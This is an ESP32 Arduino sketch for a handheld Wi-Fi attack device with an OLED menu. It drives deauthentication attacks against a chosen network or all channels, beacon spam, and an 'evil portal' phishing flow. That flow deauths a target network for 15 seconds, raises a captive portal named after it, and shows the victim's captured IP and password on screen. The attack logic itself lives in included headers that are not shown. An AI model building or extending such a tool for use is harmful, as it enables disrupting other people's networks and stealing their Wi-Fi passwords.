#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>

#include "beacon.h"
#include <esp_system.h>
#include "types.h"
#include "esp_wifi.h"
#include "config.h"
#include "web_interface.h"
#include "deauth.h"
#include "definitions.h"
#include "evil_portal.h"

int curr_channel = 1;
int last_push_btn_time = 0;
int time_to_sleep = 60000;

bool display_power_state = true;
bool wifi_connect_state = false;
bool connect_menu = false;
bool scan_menu = false;
bool deauth_menu = false;
bool handshake_menu = false;
bool all_deauth_state = false;
bool beacon_spam_state = false;

String wifi;
short wifiScroll = 0;

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

void setup() {
  pinMode(BTN_UP_PIN, INPUT_PULLUP);
  pinMode(BTN_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_SELECT_PIN, INPUT_PULLUP);
  pinMode(IR_PIN, OUTPUT);
  WiFi.disconnect();
  
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("Display error"));
    while(true);
  }

  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.clearDisplay();
  display.display();

  delay(2000);
  animateBitmapAppearFade(intro, SCREEN_WIDTH, SCREEN_HEIGHT, 1000);
  last_push_btn_time = millis(); 
  
#ifdef SERIAL_DEBUG
  Serial.begin(115200);
#endif
#ifdef LED
  pinMode(LED, OUTPUT);
#endif

  WiFi.mode(WIFI_MODE_AP);
  WiFi.softAP(AP_SSID, AP_PASS);

  start_web_interface();
}

void loop() {
  if (deauth_type == DEAUTH_TYPE_ALL) {
    if (curr_channel > CHANNEL_MAX) curr_channel = 1;
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
    curr_channel++;
    delay(10);
  } else {
    if (portalRunning) {
      updateCaptivePortal();
    }
    else {
      web_interface_handle_client();
    }
  }
  
  checkSleep();
  if (!display_power_state) return;

  btnHandler();
  drawMenu();
}

void connectToWiFi() {
  String password = "";
  start_input(&password);

  WiFi.begin(wifi.c_str(), password.c_str());
  unsigned long startAttemptTime = millis();

  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 15000) {
    display.clearDisplay();
    drawStatusBar();
    display.setCursor(0, 20);
    display.println("Connecting...");
    display.display();
    delay(500);
  }

  display.clearDisplay();
  drawStatusBar();
  display.setCursor(0, 20);
  if (WiFi.status() == WL_CONNECTED) {
    display.println("Connected!");
    wifi_connect_state = true;
  } else {
    display.println("Failed.");
    wifi_connect_state = false;
  }

  display.display();
  delay(2000);
}


void checkSleep()
{
  bool btn_pressed = !digitalRead(BTN_UP_PIN) || !digitalRead(BTN_SELECT_PIN) || !digitalRead(BTN_DOWN_PIN);

  if (btn_pressed)
  {
    if (!display_power_state)
    {
      display.ssd1306_command(SSD1306_DISPLAYON);
      display_power_state = true;
    }
    last_push_btn_time = millis(); 
    delay(20);
  }
  
  if (display_power_state)
  {
    if (millis() - last_push_btn_time >= time_to_sleep)
    {
      display_power_state = false;
      display.ssd1306_command(SSD1306_DISPLAYOFF);
      delay(20);
    } 
  }
}


std::vector<std::pair<String, int>> scanWiFiNetworks() {
  std::vector<std::pair<String, int>> networks;

  int n = WiFi.scanNetworks();
  if (n == 0) {
    networks.push_back({"No networks found", 0});
  } else {
    for (int i = 0; i < n; ++i) {
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      networks.push_back({ssid, rssi});
    }
  }

  return networks;
}


void wait_for_stop()
{
  while (true)
  {
    if (beacon_spam_state)
    {
      BeaconSpam();
    }

    if (digitalRead(BTN_SELECT_PIN) == LOW) {
      last_push_btn_time = 0;

      if (portalRunning)
      {
        stopCaptivePortal();
        delay(200);
        return;
      }
      if (beacon_spam_state)
      {
        beacon_spam_state = false;
        delay(200);
        return;
      }

      if (all_deauth_state)
      {
        ESP.restart();
        all_deauth_state = false;
        return;
      }
      else
      {
        stop_deauth();
        delay(200);
        return;
      }
    }

    display.clearDisplay();
    if (isCaptured)
    {
      display.setCursor(0, 0);
      display.println("IP: " + client_ip);
      display.println("Password: " + client_password);
      display.println("-> SELECT to stop");
    }
    
    else 
    {
      display.setCursor(0, 0);
      display.println("ATTACK...");
      display.setCursor(0, 32);
      display.println("-> SELECT to stop");
    }
    display.display();
  }
}


void get_wifi() 
{
  display.clearDisplay();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(150);

  auto networks = scanWiFiNetworks();
  int totalNetworks = networks.size();
  wifiScroll = 0;

  while (true)
  {
    checkSleep();

    if (digitalRead(BTN_SELECT_PIN) == LOW) {
      if (scan_menu){
        scan_menu = false;
       return; 
      }
      if (connect_menu){
        wifi = networks[wifiScroll].first;
        delay(200);
        connectToWiFi();
        connect_menu = false;
        return;
      }
      if (deauth_menu){
        wifi = networks[wifiScroll].first;
        delay(200);
        start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
        deauth_menu = false;
        wait_for_stop();
        return;
      }
      if (handshake_menu){
        wifi = networks[wifiScroll].first;

        delay(200);
        server.stop();

        start_deauth(wifiScroll, DEAUTH_TYPE_SINGLE, 2);
        unsigned long deauthStart = millis();

        while (millis() - deauthStart < 15000) {
            display.clearDisplay();
            display.setCursor(0, 20);
            display.println("Deauth running...");
            display.display();
            delay(100);
        }
        stop_deauth();

        startCaptivePortal(&wifi);
        wait_for_stop();

        handshake_menu = false;
        return;
      }
      delay(150);
    }

    if (digitalRead(BTN_DOWN_PIN) == LOW) {
      if (wifiScroll < totalNetworks - 1) {
        wifiScroll++;
        delay(150);
      }
    }

    if (digitalRead(BTN_UP_PIN) == LOW) {
      delay(150);
      return;
    }

    display.clearDisplay();
    drawStatusBar();

    short selectedWifiIndex = wifiScroll; 

    for (int i = 0; i < 6; ++i) {
      int idx = wifiScroll + i;
      if (idx >= totalNetworks) break;
    
      display.setCursor(0, 10 + i * 10);
      if (idx == selectedWifiIndex) {
        display.print("-> ");   
      } else {
        display.print("   ");  
      }
    
      display.print(networks[idx].first);
      display.print(" ");
      display.print(networks[idx].second);
      display.println("dBm");
    }

    display.display();
  }
}